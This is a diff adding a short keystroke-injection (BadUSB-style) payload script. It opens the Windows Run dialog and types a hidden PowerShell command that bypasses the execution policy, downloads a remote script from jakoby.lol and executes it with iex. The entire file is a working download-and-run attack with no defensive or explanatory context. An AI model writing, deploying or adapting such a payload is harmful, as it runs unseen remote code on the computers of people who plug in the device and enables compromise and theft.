@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $channel="'https://www.youtube.com/@Octo_4k/shorts'";irm jakoby.lol/wj4 | iex
+ENTER
